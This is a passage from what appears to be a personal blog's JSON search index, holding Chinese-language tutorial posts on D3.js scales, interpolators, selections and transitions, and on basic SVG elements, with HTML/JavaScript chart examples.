对于图标中可能会重叠的项，可以添加透明度，增强层次感","categories":[{"name":"D3.js","slug":"D3-js","permalink":"https://xuxb.github.io/categories/D3-js/"}],"tags":[{"name":"D3.js","slug":"D3-js","permalink":"https://xuxb.github.io/tags/D3-js/"}]},{"title":"比例尺","slug":"D3.js/比例尺","date":"2021-03-23T16:00:00.000Z","updated":"2021-04-28T02:29:34.781Z","comments":true,"path":"2021/03/24/D3.js/比例尺/","link":"","permalink":"https://xuxb.github.io/2021/03/24/D3.js/%E6%AF%94%E4%BE%8B%E5%B0%BA/","excerpt":"","text":"比例尺说明：任何数据集中的值都不太可能完全对应于可视化中使用的像素测量值。比例提供了一种方便的方法，将这些数据值映射为可用于可视化目的的新值。 d3.scale 数据集中的数据其实是通过映射成一个个坐标点后在页面中绘制出来的，而数据可能会很大或很小，所以需要将数值进行映射以适配 SVG 容器的大小 scale.copy: 创建比例尺的副本。 scale.interpolate: 取得或设置比例尺的输出插值器。 scale.invert: 取得给定输出值对应定义域中的值。 scale.nice: 扩展比例尺的定义域为一个优化的整数值。 scale.tickFormat: 取得用于展示刻度值的格式化器。 scale.ticks: 取得定义域中有代表性的值。 插值器给定函数 f(x) 在 x0, x1,...,xn 处的值。现有 x&#39;，其值在上述取值点间。那么，求 f(x&#39;)值的过程叫做 插值 插值不仅在尺度功能的实现中非常重要，对于 D3 的其他核心功能的实现也不可或缺，例如，动画和布局管理功能。因而 D3 设计了一个独立、可重用的插值器，以便在实现其他功能时提供统一的调用方式。（默认的范围域是 [0, 1]） d3.interpolate: 返回一个介于 a 和 b 之间的默认插值器(a、b可为对象，包含多个属性，使用复合尺度插值时，D3 会遍历对象中的所有成员，并对其每一个组成部分应用相应的简单插值规则) d3.interpolateNumber: 插补两个数字值 d3.interpolateString: 插补两个字符串 d3.interpolateArray: 插补两个数组 d3.interpolateHcl: 插补两个 HCL 颜色值 d3.interpolateHsl: 插补两个 HSL 颜色值 d3.interpolateLab: 插补两个 L * a * b * 颜色值 d3.interpolateObject: 插补两个任意对象 d3.interpolateRgb: 插补两个RGB颜色值 d3.interpolateRound: 插补两个整数 d3.interpolateTransform: 插补两个 2D 矩阵变换 d3.interpolateZoom: 在两个点之间平滑地缩放平移 123456789var interpolate = d3.interpolateNumber(0, 100);interpolate(0.1); // 10interpolate(0.99); // 99// 使用 d3.interpolateNumber 函数创建了一个值域为 [0, 100] 的interpolate函数，并使用这个函数对指定的数字进行插值。该函数与如下代码是等价的。// function interpolate(t)&#123;// return a * (1 - t) + b * t;// &#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;script src=&quot;http://d3js.org/d3.v3.js&quot; charset=&quot;utf-8&quot;&gt;&lt;/script&gt; &lt;script&gt; let w = 600; let h = 400; let start = &#123; &#x27;font-size&#x27;: &#x27;12px&#x27;, color: &#x27;#f00&#x27; &#125;; let end = &#123; &#x27;font-size&#x27;: &#x27;40px&#x27;, color: &#x27;#ff0&#x27; &#125;; let svg = d3.select(&#x27;body&#x27;) .append(&#x27;svg&#x27;) .attr(&#x27;width&#x27;, w) .attr(&#x27;height&#x27;, h); let interpolate = d3.interpolate(start, end); let groups = svg.append(&#x27;g&#x27;); for (let i = 1; i &lt; 10; i++) &#123; let info = interpolate(i / 10); groups.append(&#x27;text&#x27;) .text(i) .attr(&#x27;x&#x27;, 0 + i * 24) .attr(&#x27;y&#x27;, 40), .attr(&#x27;class&#x27;, &#x27;text-list&#x27;) .style(&#x27;fill&#x27;, info.color) .style(&#x27;font-size&#x27;, info[&#x27;font-size&#x27;]); &#125; &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 类别 数值尺度 d3.scale.linear: 线性比例尺 （f(n) = kx + b） d3.time.scale: 线性时间比例尺 d3.scale.pow: 指数比例尺 （f(n) = a * n ^ 2 + b） pow.exponent(k) 用于设置二项式系数 a 的值，默认为 1 d3.scale.log: 对数比例尺（f(n) = a * log(n) + b） log.base(base) : 设置这个对数比例尺的底数，默认是 10 d3.scale.quantize: 量化比例尺（定义域是连续的，值域是离散） d3.scale.identity: 线性恒等比例尺 d3.scale.quantile: 分位数比例尺 d3.scale.sqrt: 平方根比例尺 d3.scale.threshold: 临界值比例尺（值域离散） 有序尺度 d3.scale.ordinal: 序数比例尺 （key、value 映射，无具体表达式） d3.scale.category10: 该比例尺中有默认的值域中有 10 种颜色 d3.scale.category20: 该比例尺中有默认的值域中有 20 种颜色 d3.scale.category20b: 该比例尺中有默认的值域中有 20 种颜色 d3.scale.category20c: 该比例尺中有默认的值域中有 20 种颜色 线性比例尺说明：将输入域映射到连续的输出范围，类似 y=kx+b 线性函数，如将身高映射成柱状图的高度（像素），let linear = d3.scale.linear() 线性比例尺的默认输入域 [0, 1]，默认输出范围为 [0, 1]，此时为恒等函数 比例尺只是定义了一个映射规则，映射的输入值并不局限于 domain() 中的输入域 linear(x)：在输入域中的输入 x，返回输出范围对应的值。 linear.domain([min, max])：指定输入域范围 linear.range([min, max])：指定输出范围 linear.ticks()：返回比例尺输入域的代表性时间 时间比例尺说明：d3.time.scale 是 d3.scale.linear 比例尺的扩展，使用 Javascript 的 Date 对象作为其输入域 domain，let time = d3.time.scale() time: 取得给定定义域中值对应的输出范围中的值。 time.domain: 取得或设置比例尺度的定义域。 time.rangeRound: 设置比例尺的四舍五入输出范围。 time.range：取得或设置比例尺的输出范围。 序号比例尺说明：序号比例尺来映射输入域（离散）到输出范围。 let ordinal = d3.scale.ordinal() ordinal(x)：在输入域中的输入 x，返回输出范围对应的值。 ordinal.domain([a, b, ..., x])：指定输入域范围（一系列离散的数据） ordinal.range([k1, k2, ..., kn])：如果指定了输出范围，设置当前比例尺对象的输出范围为指定的 values 数组，如果 values 中的值的个数少于输入域中元素的个数，那么 values 中的值会被循环使用。（主要用于颜色） ordinal.rangePoints([min, max], padding)：指定输出范围为一个连续的区间，第一个位置和最后一个位置会因为入参 padding 的值而做相应，消减长度是padding 个间隔长度的一半；默认情况下 padding 是 0 ordinal.rangeBands([min, max], padding, outerPadding)：该函数是将区间切分成一个个小的区间段，而不是一个个刻度点（刻度在坐标轴中间，而不是在起点，适用于柱状图） rdinal.rangeRoundPoints([min, max], padding)：功能同 ordinal.rangePoints，但是该函数可以美化输出的刻度点，即保证整数 ordinal.rangeRoundBands([min, max], padding, outerPadding) 功能同 ordinal.rangeBands，但是该函数可以美化输出的区间段，即保证每个区间段的起点值都是整数 12345678910111213141516171819202122232425262728293031323334353637383940&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;script src=&quot;http://d3js.org/d3.v3.js&quot; charset=&quot;utf-8&quot;&gt;&lt;/script&gt; &lt;script&gt; let w = 800; let h = 400; let padding = 40; let dateRange = [new Date(2017, 0, 1), new Date(2018, 2, 1)]; let svg = d3.select(&#x27;body&#x27;) .append(&#x27;svg&#x27;) .attr(&#x27;width&#x27;, w) .attr(&#x27;height&#x27;, h); let xScale = d3.time.scale() .domain(dateRange) .rangeRound([padding, w - padding]); let axis = d3.svg.axis() .scale(xScale) .tickFormat(d3.time.format(&#x27;%m-%d&#x27;)); svg.append(&#x27;g&#x27;) .attr(&#x27;class&#x27;, &#x27;x-axis&#x27;) .call(axis); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;","categories":[{"name":"D3.js","slug":"D3-js","permalink":"https://xuxb.github.io/categories/D3-js/"}],"tags":[{"name":"D3.js","slug":"D3-js","permalink":"https://xuxb.github.io/tags/D3-js/"}]},{"title":"选择集","slug":"D3.js/选择集","date":"2021-03-23T16:00:00.000Z","updated":"2021-04-28T02:31:21.315Z","comments":true,"path":"2021/03/24/D3.js/选择集/","link":"","permalink":"https://xuxb.github.io/2021/03/24/D3.js/%E9%80%89%E6%8B%A9%E9%9B%86/","excerpt":"","text":"选择集选择器d3.select() 与 jQuery 的选择器类似，支持各种 CSS3 选择器，并能通过各种条件筛选（实际上使用的是浏览器提供的查询方法 document.querySelector()） 元素选择说明：d3.select()、d3.selectAll() 返回值是一组选择，该选择是一组元素。D3 绑定额外的方法到该数组上（在该对象与数组间添加了一层原型链 d3.selection.prototype），可以在选中的元素上应用操作，例如为所有选中的元素设置属性值。 d3.select() 、d3.selectAll() 返回一个选集 selection，它是 D3 操作 DOM 的入口selection.data() 操作的结果是 update 选择，这表示选择的 DOM 元素已成功绑定到指定的数据元素。update 选择还包含对 enter 和 exit 的选择。 选择集（selection） selection.select(selector): 选中第一个目标元素 selection.selectAll(selector): 选中所有符合的目标元素 selection.append(name) selection.insert(name, before) selection.remove() selection.empty() selection.filter(filter) selection.attr(name, value)：获取、设置元素的属性 selection.style(name, value, priority)：获取、设置元素的 CSS 样式 selection.classed(name, value)：获取、设置元素的 class 属性，可以对象的方式一次传入多个属性， selection.property(name, value)：获取、设置元素的 prop 特性，如是否被选中、value 等信息 selection.html(value)：用来获取或设置选定元素的 HTML selection.text(value)：用来获取或设置选定元素的文本内容 selection.size() selection.node()(type, listener, capture) 说明 当没有任何元素符合条件时，方法返回的是一个空的选择结果（selection） 这些函数可用于单个元素以及多个元素，当应用于多元素选集时，这些函数会依次作用于其中每个元素 attr()、text() 等方法中中赋值时可使用函数，如 function (data, i) &#123; console.log(this); &#125; ，其中 data 指每一项数据，i 指索引，this 指当前 DOM 元素 selection 选择集的 select、append、insert函数会返回一个新的选集，建议用缩进来区别应用于不同选集上的级联函数，如下所示： 12345d3.select(&#x27;.rect-test&#x27;) .attr(&#x27;fill&#x27;, &#x27;red&#x27;).selectAll(&#x27;text&#x27;) .attr(&#x27;x&#x27;, 100) .attr(&#x27;y&#x27;, 100); selection.data(value, key) 连接指定的一组数据的和当前选择，key 函数可以被指定为控制数据是如何连接元素 没有 key 函数时，默认使用 index 连接元素，即用 index 判断 enter、update 和 exit 选择集 有 key 函数时，用 key 函数的返回值连接元素，有利于复用 DOM 元素（与 Vue 中的 v-key 相似） selection.datum(value) 获取或设置每个选定的元素绑定的数据，不计算一个连接（因此不计算 enter 和 exit 的选择） selection.each(callback) 遍历集合中的每个元素 selection.sort(comparator) 根据指定的 comparator 函数对当前选择的元素排序 selection.order() 重新插入元素到文档，使文档顺序选与择顺序就相匹配 selection.call(callback) 调用指定函数，并返回当前选择（方便链式调用） svg.append(&#39;g&#39;).call(axis) 与 axis(svg.append(&#39;g&#39;)) 作用一样; selection.interrupt(name) 立即中断当前的过渡 selection.transition(name) 为当前选择添加过渡效果 说明： 所有绑定了数据的父元素，其子元素均具有从父元素那里继承下来的值。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt; &lt;title&gt;D3.js - 散点图&lt;/title&gt; &lt;style&gt; .axis path, .axis line &#123; fill: none; stroke: black; shape-rendering: crispEdges; &#125; .axis text &#123; font-family: sans-serif; font-size: 12px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;script src=&quot;http://d3js.org/d3.v3.js&quot; charset=&quot;utf-8&quot;&gt;&lt;/script&gt; &lt;script&gt; let w = 400; let h = 300; let padding = 30; let dataSet = [[5, 20], [480, 90], [250, 50], [100, 33], [330, 95], [410, 12], [475, 44], [25, 67], [85, 21], [220, 88]]; let svg = d3.select(&#x27;body&#x27;) .append(&#x27;svg&#x27;) .attr(&#x27;width&#x27;, w) .attr(&#x27;height&#x27;, h); let xScale = d3.scale.linear() .domain([0, d3.max(dataSet, data =&gt; data[0])]) .range([padding, w - padding * 2]); let yScale = d3.scale.linear() .domain([0, d3.max(dataSet, data =&gt; data[1])]) .range([h - padding, padding]); let rScale = d3.scale.linear() .domain([0, d3.max(dataSet, data =&gt; data[1])]) .range([4, 10]); let circles = svg.selectAll(&#x27;circle&#x27;) .data(dataSet) .enter() .append(&#x27;circle&#x27;); let xAxis = d3.svg.axis() .scale(xScale) .ticks(6) .orient(&#x27;bottom&#x27;); let yAxis = d3.svg.axis() .scale(yScale) .ticks(5) .orient(&#x27;left&#x27;); svg.append(&#x27;g&#x27;) .attr(&#x27;class&#x27;, &#x27;axis&#x27;) .attr(&#x27;transform&#x27;, `translate(0, $&#123;h - padding&#125;)`) .call(xAxis); svg.append(&#x27;g&#x27;) .attr(&#x27;class&#x27;, &#x27;axis&#x27;) .attr(&#x27;transform&#x27;, `translate($&#123;padding&#125;, 0)`) .call(yAxis); circles.attr(&#x27;cx&#x27;, data =&gt; xScale(data[0])) .attr(&#x27;cy&#x27;, data =&gt; yScale(data[1])) .attr(&#x27;r&#x27;, data =&gt; rScale(data[1])); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;","categories":[{"name":"D3.js","slug":"D3-js","permalink":"https://xuxb.github.io/categories/D3-js/"}],"tags":[{"name":"D3.js","slug":"D3-js","permalink":"https://xuxb.github.io/tags/D3-js/"}]},{"title":"过渡","slug":"D3.js/过渡","date":"2021-03-23T16:00:00.000Z","updated":"2021-04-28T02:31:04.335Z","comments":true,"path":"2021/03/24/D3.js/过渡/","link":"","permalink":"https://xuxb.github.io/2021/03/24/D3.js/%E8%BF%87%E6%B8%A1/","excerpt":"","text":"过渡d3.selection.trasition 返回一个具备过渡能力的选集 d3.selection.data(dataSet, fn) 的第二个参数 fn 数被称为对象标识函数。这个函数确保了返回对象的一致性，使数据和图形元素之间的绑定更稳定。为了保证一致性，每一个数据都应当具备一个唯一的标识，然后下次更新选集时，即便 value 发生了变化，相同 id 的数据仍然对应同一个元素。 D3 过渡并不要求每个被插值的数值都有明确的起始值和结束值。 如果缺失起始值，它将试图使用计算出的样式 如果缺失结束值，则将当前值作为常量 过渡效果 transition.duration(duration): duration 指定动画的持续时间，默认为 250ms，可传入具体数值或函数 transition.delay(delay): delay 指定动画的延迟时间，默认为 0， 可传入具体数值或函数 transition.ease(type): type 指定动画的缓动函数，默认缓动函数是 cubic-in-out，不可传入函数（通过使用 attrTween 或 styleTween 插值器中内置的定制缓动功能） 缓动模式: lnear、cubic、cubic-in-out、sin、sin-out、exp、circle、back、bounce 缓动模式修饰符: in、 out、 in-out、 out-in 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt; .rect-item &#123; fill: #090; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;script src=&quot;http://d3js.org/d3.v3.js&quot; charset=&quot;utf-8&quot;&gt;&lt;/script&gt; &lt;script&gt; let w = 600; let h = 400; let padding = 30; let dataSet = []; let id = 0; let svg = d3.select(&#x27;body&#x27;) .append(&#x27;svg&#x27;) .attr(&#x27;width&#x27;, w) .attr(&#x27;height&#x27;, h); let container = svg.append(&#x27;g&#x27;) .attr(&#x27;class&#x27;, &#x27;container&#x27;); function render(data) &#123; let rects = container.selectAll(&#x27;rect&#x27;) .data(data, (data) =&gt; data.id); let xScale = d3.scale.linear() .domain([0, data.length]) .range([0, w - padding * 2]); let yScale = d3.scale.linear() .domain([0, d3.max(data, (d) =&gt; d.value)]) .range([h - padding * 2, 0]); // update rects.attr(&#x27;class&#x27;, &#x27;rect-item&#x27;) .transition() .duration(500) .attr(&#x27;x&#x27;, (data, i) =&gt; xScale(i)) .attr(&#x27;y&#x27;, (data) =&gt; yScale(data.value)) .attr(&#x27;width&#x27;, 20) .attr(&#x27;height&#x27;, (data) =&gt; h - padding - yScale(data.value)); // enter rects.enter() .append(&#x27;rect&#x27;) .attr(&#x27;transform&#x27;, &#x27;translate(0, 100)&#x27;) .transition() .duration(500) .delay(200) .ease(&#x27;ease-in-out&#x27;) .attr(&#x27;class&#x27;, &#x27;rect-item&#x27;) .attr(&#x27;x&#x27;, (data, i) =&gt; xScale(i)) .attr(&#x27;y&#x27;, (data) =&gt; yScale(data.value)) .attr(&#x27;width&#x27;, 20) .attr(&#x27;transform&#x27;, &#x27;translate(0, 40)&#x27;) .attr(&#x27;height&#x27;, (data) =&gt; h - padding - yScale(data.value)); // exit rects.exit() .transition() .duration(500) .attr(&#x27;x&#x27;, -40) .style(&#x27;opacity&#x27;, 0) .remove(); &#125; function getRandomData() &#123; return Math.round(Math.random() * 20) + 5; &#125; for (let i = 0; i &lt; 15; i++) &#123; dataSet.push(&#123; id: ++id, value: getRandomData() &#125;); &#125; render(dataSet); window.setInterval(() =&gt; &#123; dataSet.shift(); dataSet.push(&#123; id: ++id, value: getRandomData() &#125;); render(dataSet); &#125;, 2000); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 中间帧动画 attrTween(name, tween): 据指定的补间函数 tween，通过指定的名称过渡属性值 styleTween(name, tween): 据指定的补间函数 tween，通过指定的 CSS 样式的属性值 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt; rect &#123; fill: #090; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;script src=&quot;http://d3js.org/d3.v3.js&quot; charset=&quot;utf-8&quot;&gt;&lt;/script&gt; &lt;script&gt; let w = 600; let h = 400; let svg = d3.select(&#x27;body&#x27;) .append(&#x27;svg&#x27;) .attr(&#x27;width&#x27;, w) .attr(&#x27;height&#x27;, h); function widthTween () &#123; let quantize = d3.scale.quantize() .domain([0, 1]) .range([40, 80, 120, 160, 200, 240, 280, 320, 360, 400]); return (t) =&gt; quantize(t); &#125; svg.append(&#x27;g&#x27;) .attr(&#x27;class&#x27;, &#x27;container&#x27;) .append(&#x27;rect&#x27;) .attr(&#x27;x&#x27;, 0) .attr(&#x27;y&#x27;, 20) .attr(&#x27;height&#x27;, 20) .attr(&#x27;width&#x27;, 40) .transition() .duration(4000) .ease(&#x27;linear&#x27;) .attr(&#x27;width&#x27;, 400); svg.append(&#x27;g&#x27;) .attr(&#x27;class&#x27;, &#x27;container&#x27;) .append(&#x27;rect&#x27;) .attr(&#x27;x&#x27;, 0) .attr(&#x27;y&#x27;, 60) .attr(&#x27;height&#x27;, 20) .attr(&#x27;width&#x27;, 40) .transition() .duration(4000) .ease(&#x27;linear&#x27;) .attrTween(&#x27;width&#x27;, widthTween); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 联级过渡1234567891011121314151617svg.append(&#x27;g&#x27;) .attr(&#x27;class&#x27;, &#x27;container&#x27;).append(&#x27;rect&#x27;) .attr(&#x27;x&#x27;, 0) .attr(&#x27;y&#x27;, 20) .attr(&#x27;height&#x27;, 20) .attr(&#x27;width&#x27;, 40).transition() .duration(2000) .ease(&#x27;linear&#x27;) .attr(&#x27;width&#x27;, 400).transition() .duration(1000) .attr(&#x27;height&#x27;, 60).transition() .duration(1000) .style(&#x27;fill&#x27;, &#x27;#00f&#x27;); 选择性过渡123456789101112131415161718192021let data = [&#x27;Cat&#x27;, &#x27;Dog&#x27;, &#x27;Cat&#x27;, &#x27;Dog&#x27;, &#x27;Cat&#x27;, &#x27;Dog&#x27;, &#x27;Cat&#x27;, &#x27;Dog&#x27;];svg.append(&#x27;g&#x27;) .attr(&#x27;class&#x27;, &#x27;container&#x27;).selectAll(&#x27;rect&#x27;) .data(data) .enter().append(&#x27;text&#x27;) .attr(&#x27;class&#x27;, &#x27;text-item&#x27;) .attr(&#x27;x&#x27;, 10) .attr(&#x27;y&#x27;, (data, i) =&gt; (i + 1) * 40) .text(data =&gt; data).transition() .duration(1000) .ease(&#x27;bounce&#x27;) .attr(&#x27;x&#x27;, 500).filter((data) =&gt; data === &#x27;Cat&#x27;).transition() .duration(600) .ease(&#x27;linear&#x27;) .attr(&#x27;x&#x27;, 20); 监听过渡事件123456789101112131415161718192021222324252627282930let data = [&#x27;Cat&#x27;, &#x27;Dog&#x27;, &#x27;Cat&#x27;, &#x27;Dog&#x27;, &#x27;Cat&#x27;, &#x27;Dog&#x27;, &#x27;Cat&#x27;, &#x27;Dog&#x27;];svg.append(&#x27;g&#x27;) .attr(&#x27;class&#x27;, &#x27;container&#x27;).selectAll(&#x27;rect&#x27;) .data(data) .enter().append(&#x27;text&#x27;) .attr(&#x27;class&#x27;, &#x27;text-item&#x27;) .attr(&#x27;x&#x27;, 10) .attr(&#x27;y&#x27;, (data, i) =&gt; (i + 1) * 40) .text(data =&gt; data).transition() .duration(1000) .ease(&#x27;bounce&#x27;) .attr(&#x27;x&#x27;, 500).filter((data) =&gt; data === &#x27;Cat&#x27;).transition() .duration(600) .ease(&#x27;linear&#x27;) .each(&#x27;start&#x27;, function (data) &#123; // 动画开始 d3.select(this).text(data.toUpperCase()); &#125;) .each(&#x27;end&#x27;, function () &#123; // 动画结束 d3.select(this).text(&#x27;end&#x27;); &#125;) .each(&#x27;interrupt&#x27;, function () &#123; // 动画被打断 d3.select(this).text(&#x27;interrupt&#x27;); &#125;) .attr(&#x27;x&#x27;, 20);","categories":[{"name":"D3.js","slug":"D3-js","permalink":"https://xuxb.github.io/categories/D3-js/"}],"tags":[{"name":"D3.js","slug":"D3-js","permalink":"https://xuxb.github.io/tags/D3-js/"}]},{"title":"SVG 基础元素","slug":"SVG/SVG 基础元素","date":"2021-03-23T16:00:00.000Z","updated":"2021-04-28T02:34:15.251Z","comments":true,"path":"2021/03/24/SVG/SVG 基础元素/","link":"","permalink":"https://xuxb.github.io/2021/03/24/SVG/SVG%20%E5%9F%BA%E7%A1%80%E5%85%83%E7%B4%A0/","excerpt":"","text":"SVG 基础元素SVG 元素通用属性 transform 对基础图形进行变换处理（与 CSS3 中的 transform 属性有点不一致） 平移 translate(50,30) 缩放 scale(2) 旋转 rotate(30) 翻转 skewX()、skewY(10) fill：填充色 stroke：定义图形、文本等的边线颜色 说明：支持 hover 伪类、id、class 等 SVG 元素通用 CSS 样式 display: 控制元素是否可见（inline、none，所有元素的初始值都为 inline） fill: 填充色 fill-opacity: 填充色透明度 stroke: 定义图形、文本等的边线颜色 stroke-width: 定义图形、文字边线的宽度 stroke-opacity: 定义图形、文字边线的透明度 stroke-linecap：用来定义开放式路径的端点的样式（butt、round、square） stroke-linejoin：用来控制两个线段之间的联合是如何绘制 stroke-dasharray：用来创建虚线（如 stroke-dasharray=&quot;5,5&quot;） fill-rule：判断路径的哪一侧在路径所构成的形状的内部，从而判断fill属性如何给这个形状上色 文本SVG 文本 （&lt;text&gt;）说明：用来定义文字文本，例如 &lt;text&gt;测试文字&lt;/text&gt; 支持的样式：font-family，font-style，font-weight，font-variant，font-stretch，font-size，font-size-adjust，kerning，letter-spacing，word-spacing 和 text-decoration 内联文本 （&lt;tspan&gt;）说明：嵌套在 &lt;text&gt; 标签中，与 &lt;span&gt; 标签类似，用于定义一组文本的样式 文本路径 （&lt;textPath&gt;）说明：嵌套在 &lt;text&gt; 标签中，使文字按照指定路径排列，放在 &lt;text&gt; 标记内部引用预定义的 &lt;path&gt;，引用时，使用 xlink:href 属性指明需要引用的路径的 ID 链接 （&lt;a&gt;）说明：创建一个 SVG 元素链接 xlink:show xlink:actuate xlink:href target 123456789101112131415161718192021222324252627282930313233&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;title&gt;SVG 学习&lt;/title&gt; &lt;style&gt; * &#123; margin: 0; padding: 0; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;svg width=&quot;800&quot; height=&quot;400&quot; style=&quot;border: 1px solid #aaa;&quot;&gt; &lt;defs&gt; &lt;path id=&quot;MyPath&quot; d=&quot;M 100 200 C 200 100 300 0 400 100 C 500 200 600 300 700 200 C 800 100 900 100 900 100&quot; /&gt; &lt;/defs&gt; &lt;a xlink:href=&quot;https://www.baidu.com&quot; target=&quot;_blank&quot;&gt; &lt;text x=&quot;100&quot; y=&quot;15&quot; style=&quot;fill: #009; cursor: pointer;&quot;&gt; 打开百度&lt;/text&gt; &lt;/a&gt; &lt;text x=&quot;0&quot; y=&quot;15&quot; style=&quot;fill: red;&quot; transform=&quot;rotate(30 20, 30)&quot;&gt; Just test SVG! &lt;tspan style=&quot;fill: #0f0; font-size: 26px; font-style: italic;&quot;&gt;中国人民银行&lt;/tspan&gt; nothing nothing nothing &lt;/text&gt; &lt;text&gt; &lt;textPath xlink:href=&quot;#MyPath&quot;&gt; SVG 基本功能测试基本功能测试基本功能测试基本功能测试基本功能测试 &lt;/textPath&gt; &lt;/text&gt; &lt;/svg&gt;&lt;/body&gt;&lt;/html&gt; 基本图形矩形（&lt;rect&gt;） x: 元素距离左边的距离 y: 元素距离上边的距离 width: 元素的宽度 height: 元素的高度 rx: 矩形 X 轴方向的半径 rx: 矩形 Y 轴方向的半径 圆形 （&lt;circle&gt;） cx: 圆心距离 Y 轴的距离 cy: 圆心距离 X 轴的距离 r: 圆的半径 椭圆（&lt;ellipse&gt;） cx: 圆心距离 Y 轴的距离 cy: 圆心距离 X 轴的距离 rx: 圆的 X 轴的半径 ry: 圆的 Y 轴的半径 直线（&lt;line&gt;） x1: X 轴方向的起点 y1: Y 轴方向的起点 x2: X 轴方向的终点 y2: Y 轴方向的终点 折线 （&lt;polyline&gt;） points 属性里定义了各个点的坐标，x 和 y 坐标之间用逗号分别，多个坐标之间用空格分割 例如 &lt;polyline points=&quot;3,3 10,40 50,100 20,150&quot;/&gt; 多边形 （&lt;polygen&gt;） points 属性里定义了各个点的坐标，x 和 y 坐标之间用逗号分别，多个坐标之间用空格分割，并组成闭合的环形 路径 （&lt;path&gt;） d 用于定义一系列指令，例如 &lt;path d=&quot;M150 0 L75 200 L225 200 Z&quot; /&gt; 指令 参数 名称 描述 M x,y moveto 移动到 移动虚拟画笔到指定的（x,y）坐标，仅移动不绘制 m x,y moveto 同M，但使用相对坐标 L x,y lineto 连直线到 从当前画笔所在位置绘制一条直线到指定的（x,y）坐标 l x,y lineto 同L，但使用相对坐标 H x horizontal lineto 水平连线到 绘制一条水平直线到参数指定的x坐标点，y坐标为画笔的y坐标 h x horizontal lineto 同H，但使用相对坐标 V y vertical lineto 垂直连线到 从当前位置绘制一条垂直直线到参数指定的y坐标 v y vertical lineto 同V，但使用相对坐标 C x1,y1 x2,y2 x,y curveto 三次方贝塞尔曲线 从当前画笔位置绘制一条三次贝兹曲线到参数（x,y）指定的坐标。x1，y1和x2,y2是曲线的开始和结束控制点，用于控制曲线的弧度 c x1,y1 x2,y2 x,y curveto 同C，但使用相对坐标 S x2,y2 x,y shorthand 平滑三次方贝塞尔曲线 从当前画笔位置绘制一条三次贝塞尔曲线到参数（x,y）指定的坐标。x2,y2是结束控制点。开始控制点和前一条曲线的结束控制点相同 s x2,y2 x,y shorthand 平滑三次方贝塞尔曲线 同S，但使用相对坐标 Q x1,y1 x,y 二次方贝塞尔曲线 从当前画笔位置绘制一条二次方贝塞尔曲线到参数（x,y）指定的坐标。x1,y1是控制点，用于控制曲线的弧度 q x1,y1 x,y 二次方贝塞尔曲线 同Q，但使用相对坐标 T x,y 平滑的二次贝塞尔曲线 从当前画笔位置绘制一条二次贝塞尔曲线到参数（x,y）指定的坐标。控制点被假定为最后一次使用的控制点 t x,y 平滑的二次贝塞尔曲线 同T，但使用相对坐标 A rx,ry x-axis-rotation large-arc-flag,sweepflag x,y 椭圆弧线 从当前画笔位置开始绘制一条椭圆弧线到（x,y）指定的坐标。rx和ry分别为椭圆弧线水平和垂直方向上的半径。x-axis-rotation指定弧线绕x轴旋转的度数。它只在rx和ry的值不相同是有效果。large-arc-flag是大弧标志位，取值0或1，用于决定绘制大弧还是小弧。sweep-flag用于决定弧线绘制的方向 a rx,ry x-axis-rotation large-arc-flag,sweepflag x,y 椭圆弧线 同A，但使用相对坐标 Z 无 闭合路径 从结束点绘制一条直线到开始点，闭合路径 z 无 闭合路径 同Z 12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;title&gt;SVG 学习&lt;/title&gt; &lt;style&gt; * &#123; margin: 0; padding: 0; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;svg width=&quot;400&quot; height=&quot;400&quot; style=&quot;border: 1px solid #999;&quot;&gt; 